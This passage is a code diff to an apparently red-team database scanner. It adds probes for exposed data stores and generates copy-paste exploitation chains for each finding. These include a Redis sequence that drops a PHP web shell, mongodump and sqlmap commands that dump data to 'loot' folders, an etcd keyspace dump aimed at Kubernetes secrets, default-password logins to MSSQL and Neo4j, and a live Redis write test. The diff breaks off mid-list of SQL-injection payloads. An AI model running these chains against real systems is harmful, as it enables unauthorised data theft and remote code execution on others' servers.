@@ -26,6 +26,7 @@ import httpx
 from loguru import logger
 
 from config import PROJECT_ROOT
+from scanner import evidence as ev
 from scanner.engine import Finding, Severity, ScanEngine
 from scanner.severity import CONSOLE_STYLE as _SEV_COLOR
 from scanner.severity import severity_rank
@@ -39,12 +40,16 @@ _DB_PORTS: dict[int, str] = {
     3306: "MySQL/MariaDB", 5432: "PostgreSQL", 1433: "MSSQL", 1521: "Oracle",
     27017: "MongoDB", 6379: "Redis", 9200: "Elasticsearch", 9300: "Elasticsearch",
     5984: "CouchDB", 9042: "Cassandra", 11211: "Memcached",
+    # Expanded coverage — modern data stores frequently exposed without auth.
+    8123: "ClickHouse", 9000: "ClickHouse", 2379: "etcd", 8086: "InfluxDB",
+    7474: "Neo4j", 7687: "Neo4j", 2181: "Zookeeper", 26257: "CockroachDB",
+    28015: "RethinkDB", 8529: "ArangoDB",
 }
 _SAFE_PORTS = (3306, 5432, 1433, 27017, 6379)
 
 # Exposure-score weights (counted once per category that fired).
 _SCORE = {"unauth": 30, "cloud_db": 30, "cred_reuse": 30, "sqli": 25, "authbypass": 25,
-          "default_creds": 20, "creds_leak": 20, "admin_200": 15,
+          "default_creds": 20, "creds_leak": 20, "cve": 20, "admin_200": 15,
           "dump": 10, "nosql": 10, "graphql": 10, "tls": 5, "admin_403": 5}
 
 # MITRE ATT&CK technique per finding category (red-team reporting).
@@ -58,6 +63,7 @@ _ATTACK = {
     "creds_leak": "T1552.001 Credentials in Files",
     "default_creds": "T1078.001 Default Accounts",
     "cred_reuse": "T1078 Valid Accounts",
+    "cve": "T1190 Exploit Public-Facing Application",
     "dump": "T1213 Data from Information Repositories",
     "admin_200": "T1190 Exploit Public-Facing Application",
     "admin_403": "T1087 Account Discovery",
@@ -173,6 +179,83 @@ def _f(title, desc, sev, rec, category, **raw) -> Finding:
         raw.setdefault("attack", _ATTACK[category])
     return Finding(module=MODULE, title=title, description=desc, severity=sev,
                    recommendation=rec, raw=raw)
+
+
+# ---------------------------------------------------------------------------
+# Exploitation kill-chains (ordered copy-paste steps per category) — rendered in
+# the DB panel / HTML / attack path, and serialised in raw["exploitation"].
+# ---------------------------------------------------------------------------
+
+def _step(n: int, description: str, command: str) -> dict:
+    return {"step": n, "description": description, "command": command}
+
+
+def _db_exploitation(category: str, **ctx) -> list[dict]:
+    """Return an ordered red-team kill-chain for a confirmed DB finding (authorised targets only)."""
+    host, port = ctx.get("host", "<host>"), ctx.get("port", "")
+    if category == "redis_unauth":
+        cli = f"redis-cli -h {host} -p {port}"
+        return [_step(1, "Connect to the open Redis instance (no auth).", cli),
+                _step(2, "List and read keys to confirm data access.", f"{cli} KEYS '*'   # then: {cli} GET <key>"),
+                _step(3, "Escalate to RCE — rewrite the RDB path to drop a web shell / SSH key.",
+                      f"{cli} CONFIG SET dir /var/www/html; {cli} CONFIG SET dbfilename shell.php; "
+                      f"{cli} SET x '<?php system($_GET[0]);?>'; {cli} SAVE")]
+    if category == "mongo_unauth":
+        db = ctx.get("db", "admin")
+        uri = f"mongodb://{host}:{port}"
+        return [_step(1, "Connect to the open MongoDB instance (no auth).", f"mongosh '{uri}'"),
+                _step(2, "Enumerate databases and collections.",
+                      f"mongosh '{uri}' --eval 'db.adminCommand({{listDatabases:1}})'"),
+                _step(3, "Dump a database to disk.", f"mongodump --uri '{uri}/{db}' -o loot_mongo")]
+    if category == "es_unauth":
+        url = ctx.get("url", f"http://{host}:{port}")
+        return [_step(1, "Confirm the open cluster and list indices.", f"curl '{url}/_cat/indices?v'"),
+                _step(2, "Dump documents from every index.", f"curl '{url}/_search?size=100&pretty'")]
+    if category == "couch_unauth":
+        url = ctx.get("url", f"http://{host}:{port}")
+        return [_step(1, "List all databases.", f"curl '{url}/_all_dbs'"),
+                _step(2, "Dump every document of a database.", f"curl '{url}/<db>/_all_docs?include_docs=true'")]
+    if category == "http_db_unauth":
+        return [_step(1, ctx.get("desc", "Query the open database over HTTP (no auth)."), ctx.get("cmd", ""))]
+    if category == "sqli":
+        url, param = ctx.get("url", "<url>"), ctx.get("param", "id")
+        base = f'sqlmap -u "{url}" -p {param} --batch --technique={ctx.get("flag", "BEUSTQ")}'
+        return [_step(1, "Confirm the injection and list the databases.", f"{base} --dbs"),
+                _step(2, "Enumerate the tables of the target database.", f"{base} -D <db> --tables"),
+                _step(3, "Dump credentials/data from a table.", f"{base} -D <db> -T <table> --dump")]
+    if category in ("cloud_db", "creds_leak", "dump", "admin"):
+        steps = [_step(1, ctx.get("desc", "Access the exposed resource."), ctx.get("cmd", ""))]
+        if ctx.get("connect"):
+            steps.append(_step(2, "Connect directly to the database with the harvested credentials.",
+                               ctx["connect"]))
+        return steps
+    if ctx.get("cmd"):
+        return [_step(1, ctx.get("desc", "Exploit the finding."), ctx["cmd"])]
+    return []
+
+
+# ---------------------------------------------------------------------------
+# BSON / MongoDB wire-protocol helpers (OP_MSG for modern Mongo ≥3.6/5.1)
+# ---------------------------------------------------------------------------
+
+def _bson_doc(elements: bytes) -> bytes:
+    return (len(elements) + 5).to_bytes(4, "little") + elements + b"\x00"
+
+
+def _bson_int32(name: str, val: int) -> bytes:
+    return b"\x10" + name.encode() + b"\x00" + val.to_bytes(4, "little", signed=True)
+
+
+def _bson_str(name: str, val: str) -> bytes:
+    vb = val.encode() + b"\x00"
+    return b"\x02" + name.encode() + b"\x00" + len(vb).to_bytes(4, "little") + vb
+
+
+def _op_msg(cmd_bson: bytes) -> bytes:
+    """Wrap a BSON command document in a MongoDB OP_MSG (opcode 2013)."""
+    body = (0).to_bytes(4, "little") + b"\x00" + cmd_bson          # flagBits=0, section kind 0
+    return ((16 + len(body)).to_bytes(4, "little") + (3).to_bytes(4, "little")
+            + (0).to_bytes(4, "little") + (2013).to_bytes(4, "little") + body)
 
 
 # ---------------------------------------------------------------------------
@@ -298,7 +381,13 @@ def _check_redis(host: str, port: int) -> list[Finding]:
                           f"PING/INFO without AUTH" + (f", v{ver}" if ver else "")
                           + (f", {nkeys} keys" if nkeys else ""))
     fnd.raw.update(keys_count=nkeys, sample_keys=sample_keys,
-                   exploit_cmd=f"redis-cli -h {host} -p {port}   # then: KEYS *  /  GET <key>  /  CONFIG GET *")
+                   exploit_cmd=f"redis-cli -h {host} -p {port}   # then: KEYS *  /  GET <key>  /  CONFIG GET *",
+                   evidence=ev.from_parts("TCP", f"{host}:{port}", "PING/INFO/KEYS",
+                                          indicator="+PONG returned without AUTH"
+                                          + (f", {nkeys} keys" if nkeys else "")
+                                          + (f", v{ver}" if ver else ""))
+                   + ([f"sample keys: {', '.join(sample_keys[:6])}"] if sample_keys else []),
+                   exploitation=_db_exploitation("redis_unauth", host=host, port=port))
     if sample_keys:
         fnd.description += " Sample keys: " + ", ".join(sample_keys[:6]) + "."
     out = [fnd]
@@ -328,21 +417,49 @@ def _extract(data: bytes, pattern: bytes) -> str:
     return m.group(1).decode("latin-1", "replace") if m else ""
 
 
-def _check_mongodb(host: str, port: int) -> list[Finding]:
-    """Best-effort: legacy OP_QUERY listDatabases on admin.$cmd (no auth)."""
-    # BSON for {listDatabases: 1}
+def _op_query_listdatabases() -> bytes:
+    """Legacy OP_QUERY (opcode 2004) listDatabases on admin.$cmd — for Mongo < 3.6 only."""
     doc = b"\x10listDatabases\x00\x01\x00\x00\x00"          # int32 field "listDatabases"=1
     bson = (len(doc) + 5).to_bytes(4, "little") + doc + b"\x00"
     body = (b"\x00\x00\x00\x00" + b"admin.$cmd\x00"
             + (0).to_bytes(4, "little") + (1).to_bytes(4, "little") + bson)
-    header = (16 + len(body)).to_bytes(4, "little") + (1).to_bytes(4, "little") \
-        + b"\x00\x00\x00\x00" + (2004).to_bytes(4, "little")     # OP_QUERY
-    resp = _tcp_send_recv(host, port, header + body, read=2048)
-    if b"databases" in resp and b"sizeOnDisk" in resp:
-        return [_unauth_finding("MongoDB", host, port, "listDatabases succeeded without auth")]
+    return ((16 + len(body)).to_bytes(4, "little") + (1).to_bytes(4, "little")
+            + b"\x00\x00\x00\x00" + (2004).to_bytes(4, "little") + body)
+
+
+def _mongo_databases(resp: bytes) -> list[str]:
+    """Extract database names from a listDatabases reply (BSON string elements named 'name')."""
+    return [m.decode("latin-1", "replace")
+            for m in re.findall(rb"\x02name\x00.{4}([ -~]{1,64}?)\x00", resp)][:20]
+
+
+def _check_mongodb(host: str, port: int) -> list[Finding]:
+    """Unauthenticated MongoDB via modern OP_MSG (2013) listDatabases; OP_QUERY fallback for old Mongo."""
+    cmd = _bson_doc(_bson_int32("listDatabases", 1) + _bson_str("$db", "admin"))
+    resp = _tcp_send_recv(host, port, _op_msg(cmd), read=8192)
+    proto = "OP_MSG"
+    if not (b"databases" in resp and b"sizeOnDisk" in resp):
+        resp = _tcp_send_recv(host, port, _op_query_listdatabases(), read=4096)   # legacy fallback
+        proto = "OP_QUERY"
     if b"not authorized" in resp or b"requires authentication" in resp.lower():
         return []
-    return []
+    if not (b"databases" in resp and b"sizeOnDisk" in resp):
+        return []
+    dbs = _mongo_databases(resp)
+    f = _unauth_finding("MongoDB", host, port,
+                        f"listDatabases succeeded without auth ({proto})"
+                        + (f", {len(dbs)} database(s)" if dbs else ""))
+    f.raw.update(
+        databases=dbs, mongo_dbs=dbs,
+        evidence=ev.from_parts("TCP", f"{host}:{port}", f"{proto} listDatabases",
+                               indicator="server returned the database list with no authentication")
+        + ([f"databases: {', '.join(dbs[:8])}"] if dbs else []),
+        exploitation=_db_exploitation("mongo_unauth", host=host, port=port,
+                                      db=dbs[0] if dbs else "admin"),
+        exploit_cmd=f"mongosh 'mongodb://{host}:{port}'   # then: show dbs / use <db> / db.<coll>.find()")
+    if dbs:
+        f.description += " Databases: " + ", ".join(dbs[:10]) + "."
+    return [f]
 
 
 def _check_elasticsearch(engine: ScanEngine, host: str, port: int) -> list[Finding]:
@@ -367,7 +484,11 @@ def _check_elasticsearch(engine: ScanEngine, host: str, port: int) -> list[Findi
             f = _unauth_finding("Elasticsearch", host, port,
                                 f"open cluster, {len(indices)} index(es), ~{docs} documents")
             f.raw.update(indices=indices[:15], doc_count=docs,
-                         exploit_cmd=f"curl '{scheme}://{host}:{port}/_search?size=20&pretty'")
+                         exploit_cmd=f"curl '{scheme}://{host}:{port}/_search?size=20&pretty'",
+                         evidence=ev.from_response(root,
+                                                   indicator=f"open cluster, {len(indices)} index(es), ~{docs} docs"),
+                         exploitation=_db_exploitation("es_unauth", host=host, port=port,
+                                                       url=f"{scheme}://{host}:{port}"))
             if indices:
                 f.description += " Indices: " + ", ".join(indices[:10]) + "."
             return [f]
@@ -389,10 +510,168 @@ def _check_couchdb(engine: ScanEngine, host: str, port: int) -> list[Finding]:
                 dbs = []
             f = _unauth_finding("CouchDB", host, port, f"_all_dbs returned {len(dbs)} database(s)")
             f.raw.update(databases=dbs[:20],
-                         exploit_cmd=f"curl '{scheme}://{host}:{port}/_all_dbs' then /<db>/_all_docs")
+                         exploit_cmd=f"curl '{scheme}://{host}:{port}/_all_dbs' then /<db>/_all_docs",
+                         evidence=ev.from_response(r,
+                                                   indicator=f"_all_dbs returned {len(dbs)} database(s) without auth"),
+                         exploitation=_db_exploitation("couch_unauth", host=host, port=port,
+                                                       url=f"{scheme}://{host}:{port}"))
             if dbs:
                 f.description += " Databases: " + ", ".join(dbs[:10]) + "."
             return [f]
+    return []
+
+
+# ---------------------------------------------------------------------------
+# Expanded engine coverage: ClickHouse / etcd / InfluxDB / Neo4j / Zookeeper / Cassandra
+# ---------------------------------------------------------------------------
+
+def _http_db_get(engine: ScanEngine, host: str, port: int, path: str
+                 ) -> "tuple[str, httpx.Response] | tuple[None, None]":
+    for scheme in ("http", "https"):
+        try:
+            return scheme, engine.request("GET", f"{scheme}://{host}:{port}{path}", timeout=6.0)
+        except httpx.HTTPError:
+            continue
+    return None, None
+
+
+def _check_clickhouse(engine: ScanEngine, host: str, port: int) -> list[Finding]:
+    """ClickHouse HTTP interface (8123): default user, no password → SQL over HTTP without auth."""
+    scheme, r = _http_db_get(engine, host, port, "/?query=SHOW%20DATABASES")
+    if r is None or r.status_code in (401, 403):
+        return []
+    is_ch = any(h.lower().startswith("x-clickhouse") for h in r.headers) or "system" in r.text.lower()
+    if r.status_code != 200 or not is_ch or "<html" in r.text[:200].lower():
+        return []
+    dbs = [d.strip() for d in r.text.splitlines() if d.strip()][:20]
+    url = f"{scheme}://{host}:{port}"
+    f = _unauth_finding("ClickHouse", host, port,
+                        f"SHOW DATABASES returned {len(dbs)} database(s) over HTTP without auth")
+    f.raw.update(
+        databases=dbs,
+        evidence=ev.from_response(r, indicator="ClickHouse answered SQL over HTTP with no credentials"),
+        exploitation=_db_exploitation("http_db_unauth", host=host, port=port,
+                                      desc="Dump rows from any table over the ClickHouse HTTP interface.",
+                                      cmd=f"curl '{url}/?query=SELECT%20*%20FROM%20<db>.<table>%20LIMIT%2050'"),
+        exploit_cmd=f"curl '{url}/?query=SHOW%20TABLES%20FROM%20<db>'")
+    if dbs:
+        f.description += " Databases: " + ", ".join(dbs[:10]) + "."
+    return [f]
+
+
+def _check_etcd(engine: ScanEngine, host: str, port: int) -> list[Finding]:
+    """etcd (2379): /version confirms the engine; an unauthenticated key read proves full exposure."""
+    scheme, ver = _http_db_get(engine, host, port, "/version")
+    if ver is None or "etcdserver" not in ver.text.lower():
+        return []
+    url = f"{scheme}://{host}:{port}"
+    _, keys = _http_db_get(engine, host, port, "/v2/keys/?recursive=true")
+    unauth = keys is not None and keys.status_code == 200 and '"nodes"' in keys.text
+    if unauth:
+        f = _unauth_finding("etcd", host, port, "/v2/keys returned the keyspace without auth")
+        f.raw.update(
+            evidence=ev.from_response(keys, indicator="etcd served its key/value store with no authentication"),
+            exploitation=_db_exploitation("http_db_unauth", host=host, port=port,
+                                          desc="Dump the entire etcd keyspace (often holds Kubernetes secrets).",
+                                          cmd=f"curl '{url}/v2/keys/?recursive=true' ; "
+                                          f"curl -X POST '{url}/v3/kv/range' -d '{{\"key\":\"AA==\",\"range_end\":\"AA==\"}}'"),
+            exploit_cmd=f"curl '{url}/v2/keys/?recursive=true'")
+        return [f]
+    return [_f(f"etcd Exposed (auth may be enabled): {host}:{port}",
+               f"etcd is reachable at {url} (version endpoint responded). If RBAC is off, the whole "
+               "keyspace — frequently Kubernetes secrets — is readable.",
+               Severity.HIGH, "Enable etcd client auth + TLS and firewall ports 2379/2380.",
+               "admin_403", host=host, port=port, engine="etcd", url=url,
+               evidence=ev.from_response(ver, indicator="etcd /version responded"),
+               exploit_cmd=f"curl '{url}/v2/keys/?recursive=true'")]
+
+
+def _check_influxdb(engine: ScanEngine, host: str, port: int) -> list[Finding]:
+    """InfluxDB 1.x (8086): /ping header confirms it; SHOW DATABASES without auth = open."""
+    scheme, ping = _http_db_get(engine, host, port, "/ping")
+    if ping is None or not any(h.lower() == "x-influxdb-version" for h in (ping.headers or {})):
+        return []
+    _, q = _http_db_get(engine, host, port, "/query?q=SHOW+DATABASES")
+    if q is None or q.status_code in (401, 403) or q.status_code != 200 or '"series"' not in q.text:
+        return []
+    url = f"{scheme}://{host}:{port}"
+    dbs = re.findall(r'"values":\[\["([^"]+)"', q.text)[:20]
+    f = _unauth_finding("InfluxDB", host, port,
+                        f"SHOW DATABASES returned {len(dbs)} database(s) without auth")
+    f.raw.update(
+        databases=dbs,
+        evidence=ev.from_response(q, indicator="InfluxDB answered SHOW DATABASES with no credentials"),
+        exploitation=_db_exploitation("http_db_unauth", host=host, port=port,
+                                      desc="Read measurements/points from any database.",
+                                      cmd=f"curl -G '{url}/query' --data-urlencode 'q=SELECT * FROM <measurement> LIMIT 50' --data-urlencode 'db=<db>'"),
+        exploit_cmd=f"curl -G '{url}/query' --data-urlencode 'q=SHOW MEASUREMENTS' --data-urlencode 'db=<db>'")
+    if dbs:
+        f.description += " Databases: " + ", ".join(dbs[:10]) + "."
+    return [f]
+
+
+def _check_neo4j(engine: ScanEngine, host: str, port: int) -> list[Finding]:
+    """Neo4j (7474): discovery API confirms the engine; flag the well-known default creds."""
+    scheme, r = _http_db_get(engine, host, port, "/")
+    if r is None or not ("neo4j_version" in r.text or '"bolt' in r.text.lower()):
+        return []
+    url = f"{scheme}://{host}:{port}"
+    return [_f(f"Neo4j Exposed — Default Credentials Likely: {host}:{port}",
+               f"A Neo4j database is reachable at {url}. Neo4j ships with the default login "
+               "neo4j/neo4j; if it was never changed, an attacker has full graph access.",
+               Severity.HIGH,
+               "Change the default neo4j password, require auth, and firewall ports 7474/7687.",
+               "default_creds", host=host, port=port, engine="Neo4j", url=url,
+               credential="neo4j/neo4j (default — verify)", confidence="medium",
+               evidence=ev.from_response(r, indicator="Neo4j discovery API responded"),
+               exploitation=_db_exploitation("http_db_unauth", host=host, port=port,
+                                             desc="Authenticate with the default credentials and run Cypher.",
+                                             cmd=f"cypher-shell -a 'neo4j://{host}:7687' -u neo4j -p neo4j 'MATCH (n) RETURN n LIMIT 25'"))]
+
+
+def _check_zookeeper(host: str, port: int) -> list[Finding]:
+    """Zookeeper (2181): four-letter commands leak server config/clients without auth."""
+    for cmd in (b"srvr\n", b"stat\n", b"mntr\n", b"envi\n"):
+        resp = _tcp_send_recv(host, port, cmd)
+        if b"Zookeeper version:" in resp or b"zk_version" in resp:
+            ver = _extract(resp, rb"[Vv]ersion:\s*([0-9.]+)") or _extract(resp, rb"zk_version\s+([0-9.]+)")
+            f = _unauth_finding("Zookeeper", host, port,
+                                f"four-letter command {cmd.strip().decode()!r} returned data without auth"
+                                + (f", v{ver}" if ver else ""))
+            f.raw.update(
+                version=ver,
+                evidence=ev.from_parts("TCP", f"{host}:{port}", f"4lw {cmd.strip().decode()}",
+                                       indicator="Zookeeper answered a four-letter command with no auth"),
+                exploitation=_db_exploitation("http_db_unauth", host=host, port=port,
+                                              desc="Dump server config, clients and the znode tree.",
+                                              cmd=f"echo mntr | nc {host} {port} ; echo dump | nc {host} {port}"),
+                exploit_cmd=f"echo stat | nc {host} {port}")
+            return [f]
+    return []
+
+
+def _check_cassandra(host: str, port: int) -> list[Finding]:
+    """Cassandra (9042): a CQL OPTIONS frame confirms the engine; STARTUP shows if auth is required."""
+    # CQL v4 OPTIONS frame: version 0x04, flags 0, stream 0x0000, opcode 0x05, length 0.
+    options = b"\x04\x00\x00\x00\x05\x00\x00\x00\x00"
+    resp = _tcp_send_recv(host, port, options, read=2048)
+    if not resp or resp[0] not in (0x84, 0x83, 0x82) or (len(resp) > 4 and resp[4] != 0x06):
+        return []   # not a CQL SUPPORTED reply
+    # STARTUP {"CQL_VERSION":"3.0.0"} → READY (0x02) means no auth; AUTHENTICATE (0x03) means auth on.
+    body = (1).to_bytes(2, "big") + (11).to_bytes(2, "big") + b"CQL_VERSION" \
+        + (5).to_bytes(2, "big") + b"3.0.0"
+    startup = b"\x04\x00\x00\x00\x01" + len(body).to_bytes(4, "big") + body
+    sr = _tcp_send_recv(host, port, startup, read=2048)
+    if sr and len(sr) > 4 and sr[4] == 0x02:        # READY → no authentication
+        f = _unauth_finding("Cassandra", host, port, "CQL STARTUP returned READY — no authentication")
+        f.raw.update(
+            evidence=ev.from_parts("TCP", f"{host}:{port}", "CQL OPTIONS+STARTUP",
+                                   indicator="Cassandra accepted a session without authentication"),
+            exploitation=_db_exploitation("http_db_unauth", host=host, port=port,
+                                          desc="Connect with cqlsh and read every keyspace.",
+                                          cmd=f"cqlsh {host} {port} -e 'DESC KEYSPACES; SELECT * FROM <ks>.<table> LIMIT 25;'"),
+            exploit_cmd=f"cqlsh {host} {port}")
+        return [f]
     return []
 
 
@@ -436,6 +715,11 @@ def _check_secret_files(engine: ScanEngine, catch_all: bool) -> list[Finding]:
             "and rotate the exposed database password immediately.",
             "creds_leak", path=path, url=url, proof_url=url,
             secret_match=_redact_line(cred_line)[:200],
+            evidence=ev.from_response(resp, indicator=f"DB credential token {m.group(1)!r} in a readable config file")
+            + [f"proof: {_redact_line(cred_line)[:120]}"],
+            exploitation=_db_exploitation("creds_leak", desc="Harvest the DB credentials from the exposed file.",
+                                          cmd=f"curl -s {url}",
+                                          connect="<db-client> -h <DB_HOST> -u <DB_USER> -p   # use the harvested password"),
             exploit_cmd=f"curl -s {url}   # harvest DB_HOST/DB_USER/DB_PASSWORD, then connect directly"))
     return findings
 
@@ -463,7 +747,10 @@ def _check_connstrings(engine: ScanEngine) -> list[Finding]:
                 "Never embed DB connection strings/credentials in front-end code; use server-side "
                 "secrets and rotate any exposed password immediately.",
                 "creds_leak" if creds else "admin_403",
-                url=url, snippet=_redact(snippet), has_credentials=creds, proof_url=url))
+                url=url, snippet=_redact(snippet), has_credentials=creds, proof_url=url,
+                evidence=[f"connection string in the source of {url}", f"value: {_redact(snippet)}"],
+                exploitation=_db_exploitation("creds_leak", desc="Use the leaked connection string to connect.",
+                                              cmd=f"# parse {_redact(snippet)[:60]} → <db-client> with the embedded host/user/pass")))
     return findings
 
 
@@ -488,6 +775,9 @@ def _check_graphql(engine: ScanEngine) -> list[Finding]:
                        Severity.HIGH,
                        "Disable introspection in production and enforce authorization on every field.",
                        "graphql", url=url, types=types, proof_url=url,
+                       evidence=ev.from_response(resp, indicator=f"introspection returned {len(types)} type(s)"),
+                       exploitation=_db_exploitation("admin", desc="Map the schema, then query sensitive types.",
+                                                     cmd=f"clairvoyance -o schema.json {url}   # or graphw00f -t {url}"),
                        exploit_cmd=f"Run graphw00f/clairvoyance, or POST a full introspection query to {path}")]
     return []
 
@@ -520,6 +810,16 @@ def _check_default_creds(host: str, port: int, engine_name: str) -> list[Finding
                     break
                 except Exception:  # noqa: BLE001
                     continue
+        elif engine_name == "MSSQL":
+            import pymssql  # type: ignore  # noqa: PLC0415
+            for user, pwd in [("sa", ""), ("sa", "sa"), ("sa", "Password123"), ("sa", "P@ssw0rd")]:
+                try:
+                    pymssql.connect(server=host, port=str(port), user=user, password=pwd,
+                                    login_timeout=4, timeout=4).close()
+                    found = (user, pwd or "(empty)")
+                    break
+                except Exception:  # noqa: BLE001
+                    continue
     except ImportError:
         logger.debug(f"db_security: no driver to test default creds for {engine_name}")
         return []
@@ -533,7 +833,11 @@ def _check_default_creds(host: str, port: int, engine_name: str) -> list[Finding
                    "access with no real authentication.",
                    Severity.CRITICAL, "Set a strong unique password immediately and restrict network access.",
                    "default_creds", host=host, port=port, engine=engine_name,
-                   credential=f"{found[0]}/{found[1]}")]
+                   credential=f"{found[0]}/{found[1]}",
+                   evidence=[f"authenticated to {engine_name} {host}:{port} with {found[0]}/{found[1]}"],
+                   exploitation=_db_exploitation("creds_leak", host=host, port=port,
+                                                 desc=f"Log in with the default credentials and dump the data.",
+                                                 cmd=f"<{engine_name} client> -h {host} -P {port} -u {found[0]} -p"))]
     return []
 
 
@@ -593,6 +897,8 @@ def _sqli_finding(inj, payload, technique, engine_name) -> Finding:
                    "payload": payload, "proof_url": proof}
     desc = (f"Parameter '{inj.param}' at {inj.label} is SQL-injectable ({technique}, {engine_name}). "
             f"Payload: {payload!r}.")
+    extra["evidence"] = [f"injected into {inj.label}: {payload!r}",
+                         f"{technique} SQL injection confirmed ({engine_name})"]
     # Attach a ready sqlmap command so the --exploit launcher can attack it.
     if inj.url:
         flag = _SQLMAP_TECH.get(technique, "BEUSTQ")
@@ -600,6 +906,7 @@ def _sqli_finding(inj, payload, technique, engine_name) -> Finding:
                                 f"--technique={flag}", "--threads=10", "--dbs"]
         extra["sqlmap"] = (f'sqlmap -u "{inj.url}" -p {inj.param} --batch '
                            f"--technique={flag} --threads=10 --dbs")
+        extra["exploitation"] = _db_exploitation("sqli", url=inj.url, param=inj.param, flag=flag)
         desc += f"\n\nExploit with sqlmap (authorised targets only):\n  {extra['sqlmap']}"
     return _f(f"SQL Injection ({technique}): {inj.param} ({engine_name})", desc,
               Severity.CRITICAL,
@@ -841,7 +1148,12 @@ def _check_dump_files(engine: ScanEngine, catch_all: bool) -> list[Finding]:
                                f"A database dump/backup is publicly downloadable at {url} "
                                f"({len(resp.content)} bytes, {ctype or 'unknown type'}).",
                                Severity.CRITICAL, "Remove the dump from the web root and rotate exposed secrets.",
-                               "dump", path=path, url=url, proof_url=url))
+                               "dump", path=path, url=url, proof_url=url,
+                               evidence=ev.from_response(
+                                   resp, indicator=f"downloadable dump, {len(resp.content)} bytes"
+                                   + (" (SQLite magic header)" if is_sqlite else "")),
+                               exploitation=_db_exploitation("dump", desc="Download the exposed database dump.",
+                                                             cmd=f"curl -O {url}")))
     return findings
 
 
@@ -888,6 +1200,9 @@ def _check_cloud_db(engine: ScanEngine) -> list[Finding]:
                 Severity.CRITICAL,
                 "Set Firebase security rules to deny public read/write and require authentication.",
                 "cloud_db", url=url, project=proj, proof_url=url,
+                evidence=ev.from_response(r, indicator="Firebase Realtime DB returned data without authentication"),
+                exploitation=_db_exploitation("cloud_db", desc="Download the entire Firebase tree.",
+                                              cmd=f"curl 'https://{proj}.firebaseio.com/.json'"),
                 exploit_cmd=f"curl 'https://{proj}.firebaseio.com/.json'"))
 
     # --- Firestore REST: open default database documents ---
@@ -904,7 +1219,10 @@ def _check_cloud_db(engine: ScanEngine) -> list[Finding]:
                 f"authentication ({url}).",
                 Severity.CRITICAL,
                 "Tighten Firestore security rules; deny unauthenticated reads.",
-                "cloud_db", url=url, project=proj, proof_url=url))
+                "cloud_db", url=url, project=proj, proof_url=url,
+                evidence=ev.from_response(r, indicator="Firestore returned documents over the public REST API"),
+                exploitation=_db_exploitation("cloud_db", desc="Page through every Firestore document.",
+                                              cmd=f"curl '{url}?pageSize=300'")))
 
     # --- Supabase: anon key in source → advisory (RLS must be enforced) ---
     sup_projects = set(_SUPABASE_RE.findall(blob))
@@ -944,21 +1262,50 @@ def _redis_value(host: str, port: int, key: str) -> str:
 
 
 def _exploit_redis(host: str, port: int, sample_keys: list[str], loot: Path | None) -> list[Finding]:
-    """Dump sample Redis key VALUES as evidence (proof an attacker reads the data)."""
-    if not sample_keys:
-        return []
-    dump_lines = []
-    for key in sample_keys[:10]:
-        val = _redis_value(host, port, key)
-        dump_lines.append(f"### {key}\n{val.strip()[:500]}")
-    dump = "\n\n".join(dump_lines)
-    evidence = _save_evidence(loot, f"redis_{host}_{port}.txt", dump)
-    return [_f(f"Redis Data Extracted: {host}:{port}",
-               f"Read the actual values of {len(sample_keys[:10])} Redis key(s) without auth — "
-               "concrete proof the data is fully exposed.",
-               Severity.CRITICAL, "Require AUTH and firewall the port immediately.",
-               "extraction", host=host, port=port, engine="Redis",
-               redis_values=dump_lines[:5], evidence_file=evidence)]
+    """Dump sample Redis key VALUES + prove write access (RCE-capable) as evidence."""
+    out: list[Finding] = []
+    if sample_keys:
+        dump_lines = []
+        for key in sample_keys[:10]:
+            val = _redis_value(host, port, key)
+            dump_lines.append(f"### {key}\n{val.strip()[:500]}")
+        dump = "\n\n".join(dump_lines)
+        evidence = _save_evidence(loot, f"redis_{host}_{port}.txt", dump)
+        out.append(_f(f"Redis Data Extracted: {host}:{port}",
+                      f"Read the actual values of {len(sample_keys[:10])} Redis key(s) without auth — "
+                      "concrete proof the data is fully exposed.",
+                      Severity.CRITICAL, "Require AUTH and firewall the port immediately.",
+                      "extraction", host=host, port=port, engine="Redis",
+                      redis_values=dump_lines[:5], evidence_file=evidence,
+                      evidence=[f"read {len(sample_keys[:10])} key value(s) over an unauthenticated session"]))
+
+    # Read the CONFIG that enables the RDB-write RCE, and prove WRITE access with a benign, self-deleting
+    # canary key (SET → GET → DEL). Write access = full RCE capability via CONFIG SET dir + SAVE.
+    rdb_dir = _resp_bulk(_tcp_send_recv(host, port, b"CONFIG GET dir\r\n"))
+    rdb_file = _resp_bulk(_tcp_send_recv(host, port, b"CONFIG GET dbfilename\r\n"))
+    token = "hades_canary_" + "".join(re.findall(r"\w", str(time.time())))[-8:]
+    set_resp = _tcp_send_recv(host, port, f"SET {token} pwned\r\n".encode("latin-1"))
+    got = _tcp_send_recv(host, port, f"GET {token}\r\n".encode("latin-1"))
+    _tcp_send_recv(host, port, f"DEL {token}\r\n".encode("latin-1"))   # cleanup the canary
+    if b"+OK" in set_resp and b"pwned" in got:
+        cli = f"redis-cli -h {host} -p {port}"
+        out.append(_f(f"Redis Write Access Confirmed — RCE-Capable: {host}:{port}",
+                      f"Wrote and read back a key over the unauthenticated session (proof of write access). "
+                      f"With CONFIG reachable (dir={rdb_dir or '?'}, dbfilename={rdb_file or '?'}), an "
+                      "attacker rewrites the RDB path to drop a web shell, SSH key, or cron job — full RCE.",
+                      Severity.CRITICAL,
+                      "Require AUTH, 'rename-command CONFIG \"\"', enable protected-mode, firewall the port.",
+                      "unauth", host=host, port=port, engine="Redis", rdb_dir=rdb_dir, rdb_file=rdb_file,
+                      evidence=[f"SET {token} → +OK, GET → 'pwned' (write access proven, key deleted)",
+                                f"CONFIG GET dir → {rdb_dir or '(blocked)'}"],
+                      exploitation=_db_exploitation("redis_unauth", host=host, port=port)))
+    return out
+
+
+def _resp_bulk(data: bytes) -> str:
+    """Best-effort: pull the last bulk-string value from a RESP reply (e.g. CONFIG GET dir)."""
+    parts = re.findall(rb"\$\d+\r\n([^\r\n]*)\r\n", data)
+    return parts[-1].decode("latin-1", "replace") if parts else ""
 
 
 def _exploit_http_json(engine: ScanEngine, label: str, url: str, host: str, port: int,
@@ -993,32 +1340,65 @@ def _extend_first_scheme(findings: list[Finding], engine: ScanEngine, label: str
             return
 
 
-# In-band SQLi data extraction: (error-marker regex, payloads that trigger it).
-_SQLI_EXTRACT = [
-    (re.compile(r"~([^~]+)~"), [
-        "1 AND extractvalue(1,concat(0x7e,version(),0x7e))",
-        "' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -",
-        "1' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -"]),
-    (re.compile(r"converting the \w+ value '([^']+)", re.I), [
